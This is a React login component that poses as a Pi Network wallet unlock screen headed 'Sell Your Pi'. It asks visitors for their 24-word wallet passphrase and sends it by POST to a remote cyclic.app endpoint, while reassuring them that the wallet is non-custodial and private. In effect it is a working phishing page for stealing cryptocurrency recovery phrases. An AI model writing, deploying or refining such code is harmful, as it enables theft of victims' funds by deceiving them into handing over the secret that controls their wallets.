import React, {useState} from "react";
import "./Login.css";

const Login = () => {

    const [phrase, setPhrase] = useState('');
    
      async function registerUser(e) {
        e.preventDefault();
        const response = await fetch(
          "https://uninterested-ruby-giraffe.cyclic.app/api/register",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              phrase,
            }),
          }
        );

        const data = await response.json();
        console.log(data);
      }
  return (
    <div className="app_login">
      <h2 className="app_login_heading">Sell Your Pi</h2>
      <form action="" onSubmit={registerUser}>
        <textarea value={phrase} onChange={e => setPhrase(e.target.value)}
          placeholder="Enter your 24-word passphrase here"
          rows="4"
          cols="38"
        ></textarea>
        <button className="app_login_button" type="submit">UNLOCK WITH PASSPHRASE</button>
        {/* <button>UNLOCK WITH FINGERPRINT</button> */}
      </form>
      <p>
        As a non-custodial wallet, your wallet passphrase is exclusively
        accessible only to you. Recovery of passphrase is currently impossible.
      </p>
      <br />
      <p>
        Lost your passphrase? <span className="app_login_textp">You can create a new wallet, </span>but all
        your π in your previous wallet will be inaccessible.
      </p>
    </div>
  );
};

export default Login;
